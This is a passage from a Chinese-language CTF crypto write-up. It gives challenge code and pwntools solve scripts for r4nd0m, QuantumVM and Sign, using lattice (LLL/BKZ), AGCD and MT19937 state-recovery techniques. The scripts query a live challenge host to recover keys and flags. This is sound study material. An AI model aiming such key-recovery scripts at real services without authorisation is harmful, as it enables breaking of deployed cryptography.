class="built_in">range</span>(<span class="number">2</span>, c+<span class="number">2</span>):</span><br><span class="line">        L[i, i] = n * C</span><br><span class="line">        L[<span class="number">0</span>, i] = <span class="built_in">int</span>((rr[i-<span class="number">2</span>] + ss[i-<span class="number">2</span>]) % n) * C</span><br><span class="line">        L[<span class="number">1</span>, i] = <span class="built_in">int</span>((rr[i-<span class="number">2</span>] + pool[i-<span class="number">2</span>] * B) % n) * C</span><br><span class="line">    <span class="built_in">print</span>(rr)</span><br><span class="line">    <span class="built_in">print</span>(ss)</span><br><span class="line">    <span class="built_in">print</span>(pool)</span><br><span class="line">    <span class="comment"># print(L)</span></span><br><span class="line">    res = L.LLL()</span><br><span class="line">    <span class="built_in">print</span>(B)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> res:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">abs</span>(x[<span class="number">1</span>]) == B*C:</span><br><span class="line">            d = <span class="built_in">int</span>(<span class="built_in">abs</span>(x[<span class="number">0</span>])) - <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(d.bit_length())</span><br><span class="line">            io.sendline(<span class="built_in">hex</span>(d)[<span class="number">2</span>:].encode())</span><br><span class="line">            <span class="built_in">print</span>(io.recvall(timeout = <span class="number">2</span>).decode())</span><br><span class="line">            io.close()</span><br><span class="line">    <span class="comment"># io.close()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    task = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(c):</span><br><span class="line">        task.append(asyncio.create_task(solve(_)))</span><br><span class="line">    <span class="keyword">await</span> asyncio.gather(*task)</span><br><span class="line"></span><br><span class="line">asyncio.run(main())</span><br></pre></td></tr></table></figure>

<h3 id="r4nd0m"><a href="#r4nd0m" class="headerlink" title="r4nd0m"></a>r4nd0m</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, random</span><br><span class="line">flag = os.getenv(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;flag&#123;redacted&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">key, message</span>):</span><br><span class="line">    otp = random.Random(key).randbytes(<span class="built_in">len</span>(message))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([i ^ j <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">zip</span>(otp, message)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    key = <span class="built_in">int</span>.from_bytes(flag.encode(), <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    msg = <span class="built_in">bytes</span>.fromhex(<span class="built_in">input</span>(<span class="string">&#x27;💬&#x27;</span>))[:<span class="number">64</span>]</span><br><span class="line">    err = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;🔧&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;🔒&#x27;</span>, encrypt(key ^ err, msg).<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure>

<p>对于本题，由于每次循环都重新调用random.Random生成实例，因此不是一个MT19937的问题，每次发送msg和err都为0时，会返回相同的c。</p>
<p>对于MT19937，当random.Random(seed)中seed为负数时，会先对seed取绝对值。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/python/cpython/blob/88f3f5b5f11ab8b4e767ea0111ffccd204d58454/Modules/_randommodule.c#L275">https://github.com/python/cpython/blob/88f3f5b5f11ab8b4e767ea0111ffccd204d58454/Modules/_randommodule.c#L275</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/python/cpython/blob/3.14/Lib/random.py">https://github.com/python/cpython/blob/3.14/Lib/random.py</a></p>
<p>对于err，发现会转化为int，因此考虑输入一个负数，会产生什么变化。对于msg&#x3D;‘00’*16，err&#x3D;‘0’与err&#x3D;‘-2’时，c相同。</p>
<p>那么我们从flag的低位一位一位猜测，首先对于err&#x3D;‘0’与err&#x3D;‘-2’，列一个竖式，key为????，取反表示为!!!!</p>
<p>$$\begin{array}{r} &amp; ???? \ \oplus &amp; 1…111110 \ \hline &amp; 1…11!\ !\ !? \ \end{array}$$</p>
<p>那么-key就是1…11!!!!+1，那么当最低位!&#x3D;0时,!+1&#x3D;?。因此，当c相等时，?应当为1，那么此时确定key的低1位为flag&#x3D;1。</p>
<p>推广一下，继续循环传入err&#x3D;flag，err&#x3D;flag^(-2 ** (k+1)),从k&#x3D;1开始，对于要传入encrrpt的参数key^err，对于已经求出的flag，则有key^flag&#x3D;???0000，-flag&#x3D;flag反码+1，也就是!!!1111+1&#x3D;进位到要求的位。而对于key^flag^(-2 ** (k+1))，也就是</p>
<p>???0000^1…1110000&#x3D;1…!!?0000那么根据这两个式子，就是求进位到未知位的值!+1&#x3D;?，?应当为1，当?&#x3D;0时!+1就不是1比特了。</p>
<p>所以只有?&#x3D;1的时候，密文c才相等，否则?&#x3D;0。</p>
<img src="./%E8%AE%AD%E7%BB%83%E8%B5%9B.assets/3c10ec132647c67dc556de6116028796.png" alt="3c10ec132647c67dc556de6116028796" style="zoom: 50%;" />

<p>$$1\underbrace{00 \ldots 00}_{k-1 \ 0’s}$$</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;60.205.163.215&quot;</span>, <span class="number">23330</span>)</span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">512</span>):</span><br><span class="line">    io.sendline( <span class="string">b&#x27;0&#x27;</span>*<span class="number">16</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(flag).encode())</span><br><span class="line">    io.sendline( <span class="string">b&#x27;0&#x27;</span>*<span class="number">16</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(flag^(-(<span class="number">2</span>**(k+<span class="number">1</span>)))).encode())</span><br><span class="line">    <span class="keyword">if</span> io.recvline() == io.recvline():</span><br><span class="line">        flag ^= <span class="number">2</span>**k</span><br><span class="line">    <span class="keyword">if</span> k % <span class="number">8</span> ==<span class="number">7</span>:</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(flag))</span><br></pre></td></tr></table></figure>

<h3 id="QuantumVM"><a href="#QuantumVM" class="headerlink" title="QuantumVM"></a>QuantumVM</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> qiskit <span class="keyword">import</span> QuantumCircuit</span><br><span class="line"><span class="keyword">from</span> qiskit_aer <span class="keyword">import</span> AerSimulator</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os, random</span><br><span class="line">FLAG = <span class="string">&quot;flag&#123;REDACTED&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">SIM = AerSimulator()</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">QuantumVM</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.qc = QuantumCircuit(<span class="number">256</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">            <span class="variable language_">self</span>.qc.h(i)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">exec</span>(<span class="params">self, code</span>):</span><br><span class="line">        ip = <span class="number">0</span></span><br><span class="line">        param = random.sample(<span class="built_in">range</span>(<span class="number">128</span>,<span class="number">256</span>), <span class="number">128</span>)</span><br><span class="line">        <span class="keyword">while</span> ip&lt;<span class="built_in">len</span>(code):</span><br><span class="line">            op = code[ip]; ip += <span class="number">1</span></span><br><span class="line">            num = code[ip]; ip += <span class="number">1</span></span><br><span class="line">            <span class="keyword">match</span> op:</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>: <span class="variable language_">self</span>.qc.x(num)</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>: <span class="variable language_">self</span>.qc.y(num)</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>: <span class="variable language_">self</span>.qc.z(num)</span><br><span class="line">                <span class="keyword">case</span> <span class="number">3</span>: <span class="variable language_">self</span>.qc.cx(num, param[num])</span><br><span class="line">                <span class="keyword">case</span> _: ValueError(<span class="string">&quot;Invalid Operation :(&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>): </span><br><span class="line">            <span class="keyword">if</span> random.randint(<span class="number">0</span>,<span class="number">1</span>): <span class="variable language_">self</span>.qc.x(i)</span><br><span class="line">            <span class="keyword">else</span>: <span class="variable language_">self</span>.qc.x(param[i])</span><br><span class="line">        <span class="variable language_">self</span>.qc.measure_all()</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(SIM.run(<span class="variable language_">self</span>.qc,shots=<span class="number">1</span>,memory=<span class="literal">True</span>).result().get_memory()[<span class="number">0</span>],<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">key = os.urandom(<span class="number">32</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">150</span>):</span><br><span class="line">    qvm = QuantumVM()</span><br><span class="line">    code = <span class="built_in">bytes</span>.fromhex(<span class="built_in">input</span>(<span class="string">&quot;Quantum Code &gt; &quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;⚙️&quot;</span>, bytes_to_long(key)^qvm.<span class="built_in">exec</span>(code))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;🚩&quot;</span>, AES.new(key, AES.MODE_ECB).encrypt(FLAG.encode()).<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://tangcuxiaojikuai.xyz/post/506fe59c.html">2025-N1CTF-junior-wp-crypto | 糖醋小鸡块的blog</a></p>
<p>首先服务端会生成一个32字节的key，允许用户提交150次code（十六进制形式），每一次交互都会将用户输入的code交给QuantumVM执行，服务器会将执行的结果（256位二进制字符串转为int）与key异或并发送回来，150次交互结束后输出用AES-CBC模式下key加密的flag。因此想要还原flag，就需要恢复key。</p>
<p>对于QuantumVM类，包括init和exec两部分</p>
<ul>
<li>init：创建一个256量子比特的量子电路，对于前128量子比特，应用Hadamard门使它们处于叠加态（即测量时会随机为 0 或 1，均匀分布）</li>
<li>exec(code)：code中每两个相邻字节为一组：<code>[op, num]</code>，根据op执行量子门操作。其实也就是用户可通过op选择对第num个量子比特执行单量子比特门（X, Y, Z）或，通过双量子比特门（CNOT）使第num个量子比特（0-127）和param[num]（param是128-255的随机排列的列表）进行量子纠缠。然后添加内部随机扰动，对每个i ∈ [0,127] ，以50%的概率对第i或第param[i]个量子比特加x门。最后测量所有量子比特，并返回测量结果，测量结果是一个 256 位的二进制字符串。</li>
</ul>
<p>那么可以控制op全部选择CNOT门：<code>qc.cx(num, param[num]</code>，num则设置为0~127，也就代表了前128个叠加态的比特，这样，就是将前128的叠加态量子比特作为控制比特，后128比特为目标比特，这样的话每两个比特为一组，成为一个贝尔态，对于每组的比特进行测量时，一定同为0或同为1。然后随机扰动会将每对num, param[num]中的其中一个进行比特翻转(X门)，因此最后每组比特一定是01或10 的状态。</p>
<p>也就是将code设置为<code>[3, 0, 3, 1, 3, 2, ..., 3, 127]</code>共256字节，收集150组密文c，然后将比特0映射为1，比特1映射为-1，每个c转换成一个1、-1向量，最后构成150<em>150矩阵，再拼接一个单位矩阵，并对密文的部分进行缩放( <em>2^20 )，使得前150维的权重远大于拼接的单位矩阵，如此利用BKZ找到满足C**v</em></em>&#x3D;0的短向量<strong>v</strong>，使得其与每个c向量都正交</p>
<p>$${\bf{u}}&#x3D;[v_1,\ldots  v_{150},b_1,\ldots  b_{256}]&#x3D;{\bf{v}}*L+{\bf{b}}&#x3D;\Sigma_{1}^{150}v_i(col_i(C))+[b_1,\ldots  b_{256}]$$</p>
<p>$$L&#x3D;\left[\begin{array}{cccccc} c_1[0] &amp;c_2[0] &amp;\cdots &amp; c_{150}[0]&amp; 1&amp; &amp;0 \ \cdots&amp;\cdots &amp; \cdots&amp; \cdots &amp; &amp; \ddots\ c_1[255] &amp;c_2[255] &amp; \cdots &amp; c_{150}[255] &amp; 0 &amp;&amp; 1 \end{array}\right]<em>{256*(150+256)}\ L&#x3D;[2^{20}*C|I</em>{256}]$$</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;60.205.163.215&quot;</span>, <span class="number">28432</span>)</span><br><span class="line"></span><br><span class="line">code = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">    code.append(<span class="number">3</span>)</span><br><span class="line">    code.append(i)</span><br><span class="line">code = <span class="built_in">bytes</span>(code).<span class="built_in">hex</span>().encode()</span><br><span class="line"><span class="built_in">print</span>(code)</span><br><span class="line"></span><br><span class="line">c = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">150</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Quantum Code &gt; &#x27;</span>)</span><br><span class="line">    io.sendline(code)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;⚙️&quot;</span>.encode())</span><br><span class="line">    c.append(<span class="built_in">int</span>(io.recvline()))</span><br><span class="line">io.recvuntil(<span class="string">&quot;🚩&quot;</span>.encode())</span><br><span class="line">enc = <span class="built_in">bytes</span>.fromhex(io.recvline().strip().decode())</span><br><span class="line"></span><br><span class="line">C = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">150</span>):</span><br><span class="line">    ci = <span class="built_in">bin</span>(c[i])[<span class="number">2</span>:].zfill(<span class="number">256</span>)</span><br><span class="line">    ci_vec = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> ci:</span><br><span class="line">        <span class="keyword">if</span>(j==<span class="string">&quot;0&quot;</span>):</span><br><span class="line">            ci_vec.append(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ci_vec.append(-<span class="number">1</span>)</span><br><span class="line">    C.append(ci_vec)</span><br><span class="line"></span><br><span class="line">C = Matrix(ZZ,C).T</span><br><span class="line">L = block_matrix(</span><br><span class="line">    [</span><br><span class="line">        [C,identity_matrix(<span class="number">256</span>)]</span><br><span class="line">    ]</span><br><span class="line">)</span><br><span class="line">L[:,:<span class="number">150</span>] *= <span class="number">2</span>**<span class="number">20</span></span><br><span class="line">res = L.BKZ(block_size = <span class="number">14</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line">m = res[<span class="number">150</span>:]</span><br><span class="line">key1 = <span class="string">&quot;&quot;</span></span><br><span class="line">key2 = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">    <span class="keyword">if</span>(i==<span class="number">1</span>):</span><br><span class="line">        key1 += <span class="string">&quot;0&quot;</span></span><br><span class="line">        key2 += <span class="string">&quot;1&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        key1 += <span class="string">&quot;1&quot;</span></span><br><span class="line">        key2 += <span class="string">&quot;0&quot;</span></span><br><span class="line">key1 = long_to_bytes(<span class="built_in">int</span>(key1,<span class="number">2</span>))</span><br><span class="line">key2 = long_to_bytes(<span class="built_in">int</span>(key2,<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(AES.new(key1, AES.MODE_ECB).decrypt(enc))</span><br><span class="line"><span class="built_in">print</span>(AES.new(key2, AES.MODE_ECB).decrypt(enc))</span><br><span class="line"><span class="comment"># flag&#123;Ent4ngled_5tat3_Leak_M5ggg&#125;跑一遍不一定能解出来</span></span><br></pre></td></tr></table></figure>

<h3 id="Sign"><a href="#Sign" class="headerlink" title="Sign"></a>Sign</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># util.py</span></span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getrandint</span>(<span class="params">n:<span class="built_in">int</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>.from_bytes(urandom(n//<span class="number">8</span>+<span class="number">1</span>)) % <span class="built_in">pow</span>(<span class="number">2</span>,n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FHE</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.p = getPrime(<span class="number">77</span>)</span><br><span class="line">        <span class="variable language_">self</span>.pubkeys = []</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            <span class="comment"># p*23字节xxx + 3字节xxx</span></span><br><span class="line">            <span class="comment"># p为254bit</span></span><br><span class="line">            <span class="variable language_">self</span>.pubkeys.append(<span class="variable language_">self</span>.p * getrandint(<span class="number">177</span>) + (getrandint(<span class="number">17</span>) &lt;&lt; <span class="number">8</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># msg可能是一个int列表，也可能是一个字节串</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self,msg:<span class="built_in">list</span>[<span class="built_in">int</span>] | <span class="built_in">bytes</span></span>):</span><br><span class="line">        result = []</span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> msg:</span><br><span class="line">            tmp = <span class="number">0</span></span><br><span class="line">            shuffle_base = urandom(<span class="number">16</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> shuffle_base:</span><br><span class="line">                <span class="comment"># x=i//16，y=i%16</span></span><br><span class="line">                x,y = <span class="built_in">divmod</span>(i,<span class="number">16</span>)</span><br><span class="line">                tmp += x*<span class="variable language_">self</span>.pubkeys[y] + y*<span class="variable language_">self</span>.pubkeys[x]</span><br><span class="line">            result.append(tmp + m)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"><span class="comment"># srv.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> util <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> getenv</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">string = <span class="built_in">open</span>(<span class="string">&#x27;secret.txt&#x27;</span>).read().strip().encode()</span><br><span class="line">flag = getenv(<span class="string">&#x27;FLAG&#x27;</span>).encode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    Keys = []</span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> string:</span><br><span class="line">        f = FHE()</span><br><span class="line">        s = long_to_bytes(Random().getrandbits(<span class="number">20000</span>))</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s[<span class="number">4</span>:]:</span><br><span class="line">            Keys.extend(f.encrypt([i]))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s[:<span class="number">4</span>]:</span><br><span class="line">            Keys.extend(f.encrypt([i * (m &amp; <span class="number">0x03</span>) % <span class="number">0x101</span>]))</span><br><span class="line">            m &gt;&gt;= <span class="number">2</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(Keys) == <span class="number">30000</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[+] Your ciphertext: <span class="subst">&#123;AES.new(md5(string).digest(),AES.MODE_ECB).encrypt(pad(flag,<span class="number">16</span>)).<span class="built_in">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">input</span>(<span class="string">f&#x27;[+] The keys to retrieve the global internet connection are as follows:&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30000</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;[+] <span class="subst">&#123;Keys[i]&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://crystaljiang232.github.io/crypto/wp/nctf2024/">NCTF2024 Crypto Official Writeup | 玲珑</a></p>
<p><a target="_blank" rel="noopener" href="https://languag3.github.io/2025/03/24/NCTF2024/">NCTF2024 | languag3</a></p>
<p>首先初始化FHE加密器，生成pk列表（16个254比特），然后生成一个20000比特的随机数，对于后19968比特，将会直接利用FHE加密后输出密文，对于前4字节，则重新定义了加密规则加密m的每一个字节并输出密文，m有12字节。</p>
<p>对于getrandbits(n)， n&gt;32时会多次调用getrandbits(32)，将新随机数拼接在高位，而对于MT19937，掌握连续19968比特即可恢复state，预测下一个随机数。那么对于20000比特的随机数，掌握低19968位随机数内容，即可预测高32位。</p>
<p>那么本题就变成了先解密FHE，再恢复MT状态并预测高32位随机数，最后再解出m。重点变成了如何解密FHE。</p>
<p>对于公钥pk、密文c</p>
<p>$$\begin{align} pk_i&amp;&#x3D;p<em>a_i+2^8</em>b_i\ c_i &amp;&#x3D; x<em>pk_y+y</em>pk_x+m_i\ &amp;&#x3D; x*(p<em>a_y+2^8</em>b_y)+y*(p<em>a_x+2^8</em>b_x)+m_i\ &amp;&#x3D;xya_xa_yp+2^8xyb_xb_y+m_i\ &amp;&#x3D;k_1p+2^8k_2+m_i\ 其中&amp;，x&#x3D;i&#x2F;&#x2F;16,\ y&#x3D;i\ mod 16 \end{align}$$</p>
<p><a target="_blank" rel="noopener" href="https://hasegawaazusa.github.io/agcd-note.html#fhe-%E5%85%A8%E5%90%8C%E6%80%81%E5%8A%A0%E5%AF%86">AGCD近似最大公约数问题 | 独奏の小屋</a>有基于AGCD的FHE格攻击模板</p>
<p>对于AGCD问题，其实就是求下面x序列的最大公约数</p>
<p>$$x_i&#x3D;q_ip+e_i$$</p>
<p>为了方便解题，写成</p>
<p>$$c_i&#x3D;u_ip+v_i\ 其中，u_i&#x3D;k_1,v_i&#x3D;2^8k_2+m_i$$</p>
<p>那么可考虑丢番图近似SDA格攻击，对于(c0,c1)，可消去私钥p</p>
<p>$$u_0c_1-u_1c_0&#x3D;u_0(u_1p+v_1)-u_1(u_0p+v_0)&#x3D;u_0v_1-u_1v_0$$</p>
<p>那么对于n组，可以构建格求短向量b</p>
<p>$$\left(u_0, u_1, \ldots u_{n}\right) *\left[\begin{array}{cccccc} 2^{\rho+1} &amp;c_1 &amp; c_2&amp;\ldots &amp; c_n \ &amp; -c_0 &amp; &amp; &amp;  \ &amp; &amp; -c_0 &amp; &amp;  \ &amp; &amp; &amp; \cdots &amp; \ &amp; &amp; &amp; &amp; -c_0  \ \end{array}\right]&#x3D;\left(u_02^{\rho+1}, u_0v_1-u_1v_0, \ldots u_0v_n-u_nv_0\right)&#x3D;\bf{b}$$</p>
<p>进而求得u0，已知c0，那么</p>
<p>$$c_0&#x3D;u_0p+v_0\ v_0&#x3D;c_0\mod u_0\ p&#x3D;c_0-v_0 \mod u_0\ m_0&#x3D;c_0\mod p\mod2^8$$</p>
<p>以上求p的过程可直接调用<a target="_blank" rel="noopener" href="https://github.com/jvdsn/crypto-attacks/blob/master/attacks/acd/ol.py">crypto-attacks&#x2F;attacks&#x2F;acd&#x2F;ol.py at master · jvdsn&#x2F;crypto-attacks · GitHub</a></p>
<p>然后可以利用gf2bv库预测与string相关的随机数进而求得string。</p>
<p><a target="_blank" rel="noopener" href="https://languag3.github.io/2025/03/24/NCTF2024/">NCTF2024 | languag3</a></p>
<p><a target="_blank" rel="noopener" href="https://crystaljiang232.github.io/crypto/wp/nctf2024/">NCTF2024 Crypto Official Writeup | 玲珑</a></p>
